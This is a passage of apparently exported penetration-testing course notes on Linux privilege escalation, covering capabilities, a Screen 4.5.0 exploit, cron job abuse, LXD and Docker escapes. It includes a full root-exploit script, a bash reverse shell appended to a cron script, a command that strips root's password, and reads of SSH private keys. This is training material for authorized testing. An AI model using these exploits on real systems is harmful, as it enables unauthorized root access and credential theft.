/usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;\n\n/usr/bin/vim.basic cap_dac_override=eip\n/usr/bin/ping cap_net_raw=ep\n/usr/bin/mtr-packet cap_net_raw=ep\n```\n\nThis one-liner uses the `find` command to search for all binary executables in the directories where they are typically located and then uses the `-exec` flag to run the `getcap` command on each, showing the capabilities that have been set for that binary. The output of this command will show a list of all binary executables on the system, along with the capabilities that have been set for each.\n\n---\n\n## Exploitation\n\nIf we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:\n\n#### Exploiting Capabilities\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ getcap /usr/bin/vim.basic\n\n/usr/bin/vim.basic cap_dac_override=eip\n```\n\nFor example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the `cap_dac_override` capability and perform tasks that require this capability.\n\nLet us take a look at the `/etc/passwd` file where the user `root` is specified:\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/passwd | head -n1\n\nroot:x:0:0:root:/root:/bin/bash\n```\n\nWe can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ /usr/bin/vim.basic /etc/passwd\n```\n\nWe also can make these changes in a non-interactive mode:\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\ndrxh3kr@htb[/htb]$ cat /etc/passwd | head -n1\n\nroot::0:0:root:/root:/bin/bash\n```\n\nNow, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/12-Vulnerable Services",
    "path": "02_CPTS/16-Linux Privilege Escalation/12-Vulnerable Services.md",
    "title": "12 Vulnerable Services",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer Screen. Version 4.5.0 suffers from a privilege escalation ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nMany services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.\n\n#### Screen Version Identification\n\nVulnerable Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ screen -v\n\nScreen version 4.05.00 (GNU) 10-Dec-16\n```\n\nThis allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.\n\n#### Privilege Escalation - Screen_Exploit.sh\n\nVulnerable Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./screen_exploit.sh \n\n~ gnu/screenroot ~\n[+] First, we create our shell and library...\n[+] Now we create our /etc/ld.so.preload file...\n[+] Triggering...\n' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.\n[+] done!\nNo Sockets found in /run/screen/S-mrb3n.\n\n# id\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)\n```\n\nThe below script can be used to perform this privilege escalation attack:\n\n#### Screen_Exploit_POC.sh\n\nCode: bash\n\n```bash\n#!/bin/bash\n# screenroot.sh\n# setuid screen v4.5.0 local root exploit\n# abuses ld.so.preload overwriting to get root.\n# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html\n# HACK THE PLANET\n# ~ infodox (25/1/2017)\necho \"~ gnu/screenroot ~\"\necho \"[+] First, we create our shell and library...\"\ncat << EOF > /tmp/libhax.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/stat.h>\n__attribute__ ((__constructor__))\nvoid dropshell(void){\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n    printf(\"[+] done!\\n\");\n}\nEOF\ngcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c\nrm -f /tmp/libhax.c\ncat << EOF > /tmp/rootshell.c\n#include <stdio.h>\nint main(void){\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(\"/bin/sh\", NULL, NULL);\n}\nEOF\ngcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration\nrm -f /tmp/rootshell.c\necho \"[+] Now we create our /etc/ld.so.preload file...\"\ncd /etc\numask 000 # because\nscreen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\" # newline needed\necho \"[+] Triggering...\"\nscreen -ls # screen itself is setuid, so...\n/tmp/rootshell\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/13-Cron Job Abuse",
    "path": "02_CPTS/16-Linux Privilege Escalation/13-Cron Job Abuse.md",
    "title": "13 Cron Job Abuse",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The crontab command can create ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nCron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.\n\nThe root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.\n\nCertain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.\n\nFirst, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.\n\nCron Job Abuse\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null\n\n/etc/cron.daily/backup\n/dmz-backups/backup.sh\n/proc\n/sys/fs/cgroup/memory/init.scope/cgroup.event_control\n\n<SNIP>\n/home/backupsvc/backup.sh\n\n<SNIP>\n```\n\nA quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` shell script is world writeable and runs as root.\n\nCron Job Abuse\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -la /dmz-backups/\n\ntotal 36\ndrwxrwxrwx  2 root root 4096 Aug 31 02:39 .\ndrwxr-xr-x 24 root root 4096 Aug 31 02:24 ..\n-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh\n-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz\n```\n\nWe can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).\n\nLet's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).\n\nCron Job Abuse\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./pspy64 -pf -i 1000\n\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\n\n     ██▓███    ██████  ██▓███ ▓██   ██▓\n    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒\n    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░\n    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░\n    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░\n    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ \n    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ \n    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  \n                   ░           ░ ░     \n                               ░ ░     \n\nConfig: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService \n2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation \n2020/09/04 20:45:03 CMD: UID=0    PID=99     | \n2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd \n\n<SNIP>\n\n2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f \n2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f \n2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon \n2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind \n2020/09/04 20:45:03 CMD: UID=0    PID=10     | \n2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh \n2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2203   | \n2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip \n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh \n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n```\n\nFrom the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.\n\nWe can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.\n\nCron Job Abuse\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /dmz-backups/backup.sh \n\n#!/bin/bash\n SRCDIR=\"/var/www/html\"\n DESTDIR=\"/dmz-backups/\"\n FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz\n tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR\n```\n\nWe can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\n\nCode: bash\n\n```bash\n#!/bin/bash\nSRCDIR=\"/var/www/html\"\nDESTDIR=\"/dmz-backups/\"\nFILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz\ntar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR\n \nbash -i >& /dev/tcp/10.10.14.3/443 0>&1\n```\n\nWe modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!\n\nCron Job Abuse\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lnvp 443\n\nlistening on [any] 443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882\nbash: cannot set terminal process group (9143): Inappropriate ioctl for device\nbash: no job control in this shell\n\nroot@NIX02:~# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@NIX02:~# hostname\nhostname\nNIX02\n```\n\nWhile not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/14-Containers",
    "path": "02_CPTS/16-Linux Privilege Escalation/14-Containers.md",
    "title": "14 Containers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system...",
    "category": "02_CPTS",
    "content": "\n---\n\nContainers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.\n\nIsolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.\n\n---\n\n## Linux Containers\n\nLinux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.\n\nBy default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.\n\nThe ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers. The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.\n\n#### Linux Daemon\n\nLinux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:\n\nContainers\n\n```shell-session\ncontainer-user@nix02:~$ id\n\nuid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)\n```\n\nFrom here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.\n\nContainers\n\n```shell-session\ncontainer-user@nix02:~$ cd ContainerImages\ncontainer-user@nix02:~$ ls\n\nubuntu-template.tar.xz\n```\n\nSuch templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.\n\nContainers\n\n```shell-session\ncontainer-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp\ncontainer-user@nix02:~$ lxc image list\n\n+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+\n|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |\n+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+\n| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |\n+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+\n```\n\nAfter verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.\n\nContainers\n\n```shell-session\ncontainer-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true\ncontainer-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n```\n\nOnce we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.\n\nContainers\n\n```shell-session\ncontainer-user@nix02:~$ lxc start privesc\ncontainer-user@nix02:~$ lxc exec privesc /bin/bash\nroot@nix02:~# ls -l /mnt/root\n\ntotal 68\nlrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Sep 22 11:34 boot\ndrwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom\ndrwxr-xr-x  19 root root  3940 Oct 24 13:28 dev\ndrwxr-xr-x 100 root root  4096 Sep 22 13:27 etc\ndrwxr-xr-x   3 root root  4096 Sep 22 11:06 home\nlrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32\ndrwx------   2 root root 16384 Oct  6  2021 lost+found\ndrwxr-xr-x   2 root root  4096 Oct 24 13:28 media\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 mnt\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 opt\ndr-xr-xr-x 307 root root     0 Oct 24 13:28 proc\ndrwx------   6 root root  4096 Sep 26 21:11 root\ndrwxr-xr-x  28 root root   920 Oct 24 13:32 run\nlrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin\ndrwxr-xr-x   7 root root  4096 Oct  7  2021 snap\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 srv\ndr-xr-xr-x  13 root root     0 Oct 24 13:28 sys\ndrwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp\ndrwxr-xr-x  14 root root  4096 Sep 22 11:11 usr\ndrwxr-xr-x  13 root root  4096 Apr 23  2020 var\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/15-Docker",
    "path": "02_CPTS/16-Linux Privilege Escalation/15-Docker.md",
    "title": "15 Docker",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at th...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nDocker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. One advantage is that containerization thus consumes significantly fewer resources than a traditional server or virtual machine. The core feature of Docker is that applications are encapsulated in so-called Docker containers. They can thus be used for any operating system. A Docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime.\n\n---\n\n## Docker Architecture\n\nAt the core of the Docker architecture lies a client-server model, where we have two primary components:\n\n- The Docker daemon\n- The Docker client\n\nThe Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.\n\n#### Docker Daemon\n\nThe `Docker Daemon`, also known as the Docker server, is a critical part of the Docker platform that plays a pivotal role in container management and orchestration. Think of the Docker Daemon as the powerhouse behind Docker. It has several essential responsibilities like:\n\n- running Docker containers\n    \n- interacting with Docker containers\n    \n- managing Docker containers on the host system.\n    \n\n#### Managing Docker Containers\n\nFirstly, it handles the core containerization functionality. It coordinates the creation, execution, and monitoring of Docker containers, maintaining their isolation from the host and other containers. This isolation ensures that containers operate independently, with their own file systems, processes, and network interfaces. Furthermore, it handles Docker image management. It pulls images from registries, such as [Docker Hub](https://hub.docker.com/) or private repositories, and stores them locally. These images serve as the building blocks for creating containers.\n\nAdditionally, the Docker Daemon offers monitoring and logging capabilities, for example:\n\n- Captures container logs\n    \n- Provides insight into container activities, errors, and debugging information.\n    \n\nThe Daemon also monitors resource utilization, such as CPU, memory, and network usage, allowing us to optimize container performance and troubleshoot issues.\n\n#### Network and Storage\n\nIt facilitates container networking by creating virtual networks and managing network interfaces. It enables containers to communicate with each other and the outside world through network ports, IP addresses, and DNS resolution. The Docker Daemon also plays a critical role in storage management, since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachment, and clean-up, allowing containers to share or store data independently of each other.\n\n#### Docker Clients\n\nWhen we interact with Docker, we issue commands through the `Docker Client`, which communicates with the Docker Daemon (through a `RESTful API` or a `Unix socket`) and serves as our primary means of interacting with Docker. We also have the ability to create, start, stop, manage, remove containers, search, and download Docker images. With these options, we can pull existing images to use as a base for our containers or build our custom images using Dockerfiles. We have the flexibility to push our images to remote repositories, facilitating collaboration and sharing within our teams or with the wider community.\n\nIn comparison, the Daemon, on the other hand, carries out the requested actions, ensuring containers are created, launched, stopped, and removed as required.\n\nAnother client for Docker is `Docker Compose`. It is a tool that simplifies the orchestration of multiple Docker containers as a single application. It allows us to define our application's multi-container architecture using a declarative `YAML` (`.yaml`/`.yml`) file. With it, we can specify the services comprising our application, their dependencies, and their configurations. We define container images, environment variables, networking, volume bindings, and other settings. Docker Compose then ensures that all the defined containers are launched and interconnected, creating a cohesive and scalable application stack.\n\n#### Docker Desktop\n\n`Docker Desktop` is available for MacOS, Windows, and Linux operating systems and provides us with a user-friendly GUI that simplifies the management of containers and their components. This allows us to monitor the status of our containers, inspect logs, and manage the resources allocated to Docker. It provides an intuitive and visual way to interact with the Docker ecosystem, making it accessible to developers of all levels of expertise, and additionally, it supports Kubernetes.\n\n---\n\n## Docker Images and Containers\n\nThink of a `Docker image` as a blueprint or a template for creating containers. It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations. An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments. We can create images using a text file called a `Dockerfile`, which defines the steps and instructions for building the image.\n\nA `Docker container` is an instance of a Docker image. It is a lightweight, isolated, and executable environment that runs applications. When we launch a container, it is created from a specific image, and the container inherits all the properties and configurations defined in that image. Each container operates independently, with its own filesystem, processes, and network interfaces. This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference.\n\nWhile `images` are immutable and `read-only`, `containers` are mutable and `can be modified` during runtime. We can interact with containers, execute commands within them, monitor their logs, and even make changes to their filesystem or environment. However, any modifications made to a container's filesystem are not persisted unless explicitly saved as a new image or stored in a persistent volume.\n\n---\n\n## Docker Privilege Escalation\n\nWhat can happen is that we get access to an environment where we will find users who can manage docker containers. With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. We can use several ways and techniques to escalate our privileges or escape the docker container.\n\n#### Docker Shared Directories\n\nWhen using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container. This is incredibly useful for persisting data, sharing code, and facilitating collaboration between development environments and Docker containers. However, it always depends on the setup of the environment and the goals that administrators want to achieve. To create a shared directory, a path on the host system and a corresponding path within the container is specified, creating a direct link between the two locations.\n\nShared directories offer several advantages, including the ability to persist data beyond the lifespan of a container, simplify code sharing and development, and enable collaboration within teams. It's important to note that shared directories can be mounted as read-only or read-write, depending on specific administrator requirements. When mounted as read-only, modifications made within the container won't affect the host system, which is useful when read-only access is preferred to prevent accidental modifications.\n\nWhen we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.\n\nDocker\n\n```shell-session\nroot@container:~$ cd /hostsystem/home/cry0l1t3\nroot@container:/hostsystem/home/cry0l1t3$ ls -l\n\n-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history\n-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout\n-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc\ndrwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh\n\n\nroot@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa\n\n-----BEGIN RSA PRIVATE KEY-----\n<SNIP>\n```\n\nFrom here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.\n\nDocker\n\n```shell-session\ndrxh3kr@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv\n```\n\n#### Docker Sockets\n\nA Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.\n\nNevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios. However, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain very useful information for us that we can use to escape the Docker container.\n\nDocker\n\n```shell-session\nhtb-student@container:~/app$ ls -al\n\ntotal 8\ndrwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .\ndrwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..\nsrw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock\n```\n\nFrom here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x86_64/docker) and upload it to the Docker container.\n\nDocker\n\n```shell-session\nhtb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker\nhtb-student@container:/tmp$ chmod +x docker\nhtb-student@container:/tmp$ ls -l\n\n-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker\n\n\nhtb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps\n\nCONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES\n3fe8a4782311     main_app      \"/docker-entry.s...\"    3 days ago    Up 12 minutes    443/tcp   app\n<SNIP>\n```\n\nWe can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.\n\nDocker\n\n```shell-session\nhtb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app\nhtb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps\n\nCONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES\n7ae3bcc818af     main_app      \"/docker-entry.s...\"    12 seconds ago    Up 8 seconds     443/tcp   app\n3fe8a4782311     main_app      \"/docker-entry.s...\"    3 days ago        Up 17 minutes    443/tcp   app\n<SNIP>\n```\n\nNow, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.\n\nDocker\n\n```shell-session\nhtb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash\n\n\nroot@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa\n\n-----BEGIN RSA PRIVATE KEY-----\n<SNIP>\n```\n\nFrom there, we can again try to grab the private SSH key and log in as root or as any other user on the system with a private SSH key in its folder.\n\n#### Docker Group\n\nTo gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.\n\nDocker\n\n```shell-session\ndocker-user@nix02:~$ id\n\nuid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)\n```\n\nAlternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.\n\nMost hosts have a direct internet connection because the base images and containers must be downloaded. However, many hosts may be disconnected from the internet at night and outside working hours for security reasons. However, if these hosts are located in a network where, for example, a web server has to pass through, it can still be reached.\n\nTo see which images exist and which we can access, we can use the following command:\n\nDocker\n\n```shell-session\ndocker-user@nix02:~$ docker image ls\n\nREPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE\nubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB\n```\n\n#### Docker Socket\n\nA case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be 